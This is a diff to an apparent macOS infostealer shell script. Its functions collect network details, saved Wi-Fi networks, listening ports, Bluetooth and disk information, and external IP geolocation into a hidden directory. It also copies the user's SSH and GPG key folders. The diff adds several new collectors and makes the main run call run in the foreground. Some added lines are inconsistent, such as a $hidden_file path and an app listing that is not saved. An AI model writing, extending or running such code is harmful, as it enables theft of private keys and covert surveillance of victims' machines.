@@ -44,16 +44,29 @@ network_details() {
   ifconfig >> "$hidden_dir/network/ifconfig.txt"
   arp -a >> "$hidden_dir/network/arp.txt"
   networksetup -listpreferredwirelessnetworks en0 | awk 'NR>1 {print $1}' >> "$hidden_dir/network/saved_wifi_ssid.txt"
+  lsof -Pn -i4 | grep LISTEN >> $hidden_file/network/listening_ports.txt
 
   for ext_net in ip city region country loc org postal timezone; do
     echo " $ext_net - $(curl -s https://ipinfo.io/$ext_net)" >> "$hidden_dir/network/external_net"
   done
 }
 
+exfil_bt() {
+  system_profiler SPBluetoothDataType >> $hidden_dir/network/bluetooth.txt
+}
+
 exfil_keys() {
   mkdir -p "$hidden_dir/keys"
   cp -r ~/.ssh  $hidden_dir/keys/ &> /dev/null
   cp -r ~/.gnupg $hidden_dir/keys/ &> /dev/null
+}
+
+exfil_fs() {
+  df -h > $hidden_dir/configs/df.txt
+}
+
+exfil_apps() {
+  ls /Applications
 }
 
 exfil_config() {
@@ -88,6 +101,7 @@ cleanup() {
 
 run() {
   network_details
+  exfil_bt
   exfil_keys
   exfil_config
   exfil_cloud
@@ -97,5 +111,4 @@ run() {
   #cleanup
 }
 
-run &
-
+run
